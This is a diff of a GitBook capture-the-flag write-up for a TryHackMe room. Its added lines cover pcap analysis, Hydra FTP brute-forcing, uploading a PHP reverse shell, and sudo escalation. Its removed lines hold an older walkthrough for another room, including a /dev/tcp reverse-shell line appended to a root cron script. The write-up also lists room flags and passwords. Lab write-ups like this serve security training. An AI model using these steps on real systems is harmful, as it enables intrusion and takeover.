@@ -2,7 +2,7 @@
 
 <div align="left">
 
-<figure><img src=".gitbook/assets/spaces_EhofjMfYbx3gOUSReXD7_uploads_git-blob-09d7b5dbac78c58c7b74721476ee6617c8b73086_startup (1).png" alt=""><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>
+<figure><img src=".gitbook/assets/4754ca4214993b9701c7668bbca1a86a.png" alt="" width="183"><figcaption><p><a href="https://tryhackme.com/room/h4cked">https://tryhackme.com/room/h4cked</a></p></figcaption></figure>
 
 </div>
 
@@ -22,7 +22,7 @@ cd thm/h4cked.thm
 mkdir {nmap,content,exploits,scripts}
 ```
 
-We don't need to deploy machine, but we need to analyze pcap file to explore activities and answer at questions.
+In the task 2, we don't need to deploy machine, but we need to analyze pcap file to explore activities and answer at questions.
 
 <figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
@@ -68,113 +68,93 @@ Following TCP stream we found that correct psw is:
 password123
 {% endhint %}
 
-### 2.5 - What is the current FTP working directory after the attacker logged in? 
+### 2.5 - What is the current FTP working directory after the attacker logged in?
 
-\
+<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
-\
-
+{% hint style="info" %}
+/var/www/html
+{% endhint %}
 
 ### 2.6 - The attacker uploaded a backdoor. What is the backdoor's filename? 
 
-\
-
-
-
+<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-
+shell.php
 {% endhint %}
 
 ### 2.7 - The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?&#x20;
 
-
-
-
+<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-
+[http://pentestmonkey.net/tools/php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell)
 {% endhint %}
 
 ### 2.8 - Which command did the attacker manually execute after getting a reverse shell?
 
-
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-
+whoami
 {% endhint %}
-
-
 
 ### 2.9 - What is the computer's hostname?
 
+<div align="left">
 
+<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+</div>
 
 {% hint style="info" %}
-
+wir3
 {% endhint %}
-
-###
 
 ### 2.10 - Which command did the attacker execute to spawn a new TTY shell?
 
-\
+<div align="left">
 
+<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
-{% hint style="info" %}
-
-{% endhint %}
-
-
-
-### &#x20;2.11 - Which command was executed to gain a root shell? 
-
-\
-
+</div>
 
 {% hint style="info" %}
-
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endhint %}
 
-\
+### 2.11 - Which command was executed to gain a root shell? 
 
+<div align="left">
 
-### 2.12 - The attacker downloaded something from GitHub. What is the name of the GitHub project? 
+<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
-\
-\
-
-
-\
-
+</div>
 
 {% hint style="info" %}
-
+sudo su
 {% endhint %}
 
-\
+### 2.12 - The attacker downloaded something from GitHub. What is the name of the GitHub project?
 
+<div align="left">
+
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+{% hint style="info" %}
+Reptile
+{% endhint %}
 
 ### 2.13 - The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
 
-\
-
+<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-
+rootkit
 {% endhint %}
-
-\
-
-
-
-
-
 
 ## Task 3 - Hack your way back into the machine
 
@@ -182,279 +162,124 @@ Deploy the machine.
 
 The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!
 
+🎯 Target IP: `10.10.123.131`
+
 ### 3.1 - Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list. 
 
-\
-\
+We can use hydra with wordlist to find psw for 'jenny' user:
 
+```bash
+hydra -l jenny -P /usr/share/wordlists/metasploit/unix_passwords.txt h4cked.thm -t 4 ftp
+```
 
-\
-
+<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-
+987654321
 {% endhint %}
-
-\
-
 
 ### 3.2 - Change the necessary values inside the web shell and upload it to the webserver
 
+We can download php web shell on pentester monkey website: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
-
-\
-
-
-{% hint style="info" %}
-
-{% endhint %}
-
-\
-
-
-### 3.3 - Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server. 
-
-\
-
-
-\
-
-
-{% hint style="info" %}
-
-{% endhint %}
-
-
-
-### &#x20;3.4 - Become root!   
-
-\
-
-
-{% hint style="info" %}
-
-{% endhint %}
-
-\
-
-
-### 3.5 - Read the flag.txt file inside the Reptile directory 
-
-\
-
-
-
-
-```bash
-```
-
-```bash
-l
-```
-
-<details>
-
-<summary>🚩 Flag (root.txt)</summary>
-
-
-
-</details>
-
-###
-
-
-
-\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
-
-
-
-Using gobuster we try to find hidden path
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-31-10.png" alt=""><figcaption></figcaption></figure>
-
-The best solution is to create a .php reverse shell and put in ftp folder via FTP
-
-We copy php-reverse-shell.php just ready from php webshells folder
-
-```bash
-cp /usr/share/webshells/php/php-reverse-shell.php .
-```
-
-and custom it using our IP and Port:
-
-```bash
-ano php-reverse-shell.php
-```
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-51-58.png" alt=""><figcaption></figcaption></figure>
-
-Rename it:
-
-```bash
-mv php-reverse-shell.php shell.php
-```
-
-and put in ftp folder via FTP:
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-54-53.png" alt=""><figcaption></figcaption></figure>
-
-and start netcat on the same reverse shell port (444):
-
-```bash
-nc -lvnp 444
-```
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-03-57.png" alt=""><figcaption></figcaption></figure>
-
-Now, we're in! Check flags here..
+and custom it with our local IP:
 
 <div align="left">
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-09-08.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
-We see an interesting file "recipe.txt", and we find information that we need!
+After that, we can connect with FTP credentials and put in our custom php reverse shell.
 
 ```bash
-cat recipe.txt
+ftp h4cked.thm
+Connected to h4cked.thm.
+220 Hello FTP World!
+Name (h4cked.thm:kali): jenny
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put php-reverse-shell.php
+local: php-reverse-shell.php remote: php-reverse-shell.php
+229 Entering Extended Passive Mode (|||51568|)
+150 Ok to send data.
+100% |************************************************************************************************************|  5493       30.99 MiB/s    00:00 ETA
+226 Transfer complete.
+5493 bytes sent in 00:00 (38.18 KiB/s)
+
+ftp> chmod 777 php-reverse-shell.php
+200 SITE CHMOD command ok.
+ftp> ls
+229 Entering Extended Passive Mode (|||11129|)
+150 Here comes the directory listing.
+-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
+-rwxrwxrwx    1 1000     1000         5493 Oct 02 22:48 php-reverse-shell.php
+-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
+226 Directory send OK.
+ftp> bye
+221 Goodbye.
 ```
 
-_Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love._
+### 3.3 - Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.
 
-{% hint style="info" %}
-love
-{% endhint %}
+Now, we need to listen on the port setted on reverse shell, and access to machine.
 
-### Task 3 - What are the contents of user.txt?
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
-We quickly try to find user.txt flag using find command:\
-
+As you can see, this shell is not stable. So, we can use the traditional Python script to make it more stable.
 
 ```bash
-find / -type f -iname user.txt 2>/dev/null
+python3 -c 'import pty;pty.spawn("/bin/bash")' 
 ```
 
-but we don't find anything! Then we need to explore files or escalate privileges
+### 3.4 - Become root!
 
-We notes an interesting dir called: incidents, with suspicious.pcapng (wireshark ext), we try to get it, but permission is denied!
+We know that www-data user haven't root privileges. But we also know that Jenny has root privileges on the machine. So, let us change the user to Jenny and become root.\
 
-Then, we can use netcat to open a new connection and transfer it:
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-25-20.png" alt=""><figcaption></figcaption></figure>
-
-We can analyze susp.pcap file using wireshark or strings:
 
 ```bash
-strings susp.pcap
+whoami
+www-data
+www-data@wir3:/$ su jenny
+su jenny
+Password: 987654321
+
+jenny@wir3:/$ sudo -l
+sudo -l
+[sudo] password for jenny: 987654321
+
+Matching Defaults entries for jenny on wir3:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jenny may run the following commands on wir3:
+    (ALL : ALL) ALL
+jenny@wir3:/$ sudo su
+sudo su
+root@wir3:/
 ```
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-33-24.png" alt=""><figcaption></figcaption></figure>
+### 3.5 - Read the flag.txt file inside the Reptile directory
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-37-44 (1).png" alt=""><figcaption></figcaption></figure>
-
-We see this psw: c4ntg3t3n0ughsp1c3 we can try to use it!
+We just say that flag is in path /root/Reptile, then we quickly go them.
 
 ```bash
-ssh lennie@startup.thm
-```
-
-```bash
-lennie@startup.thm's password: 
-Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-44 packages can be updated.
-30 updates are security updates.
-
-
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-$ ls
-Documents  scripts  user.txt
-$ cat user.txt
-```
-
-<details>
-
-<summary>🚩 Flag 1 (user.txt)</summary>
-
-THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
-
-</details>
-
-### Task 4 - What are the contents of root.txt?
-
-We can continue to explore files:
-
-```bash
-ls -lah *
-    -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
-    
-    Documents:
-    total 20K
-    drwxr-xr-x 2 lennie lennie 4.0K Nov 12  2020 .
-    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
-    -rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
-    -rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
-    -rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
-    
-    scripts:
-    total 16K
-    drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
-    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
-    -rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-    -rw-r--r-- 1 root   root      1 May 15 13:38 startup_list.txt
-
-cat scripts/*
-cat Documents/*
-cat /etc/print.sh
-ls -lah /etc/print.sh
-	-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
-```
-
-We see that planner.sh will be run as root (with a cron job), and use /etc/print.sh with lennie permission, we can modify it inserting a reverse shell as payload:
-
-```bash
-echo "/bin/bash -i >& /dev/tcp/10.9.80.228/666 0>&1" >> /etc/print.sh                                                     
-```
-
-Then, we run on our kali machine netcat on the same port (666):
-
-```bash
-nc -nvlp 666
-```
-
-and wait root that will run the planner.sh script once a minute.
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-37-21.png" alt=""><figcaption></figcaption></figure>
-
-Well done! We find root flag:
-
-```bash
+cd /root/Reptile
+root@wir3:~/Reptile
 ls
-cat root.txt
+configs   Kconfig  Makefile  README.md  userland
+flag.txt  kernel   output    scripts
+root@wir3:~/Reptile
+cat flag.txt
 ```
-
-<div align="left">
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-38-55.png" alt=""><figcaption></figcaption></figure>
-
-</div>
 
 <details>
 
-<summary>🚩 Flag 2 (root.txt)</summary>
+<summary>🚩 Root Flag (flag.txt)</summary>
 
-THM{f963aaa6a430f210222158ae15c3d76d}
+ebcefd66ca4b559d17b440b6e67fd0fd
 
 </details>
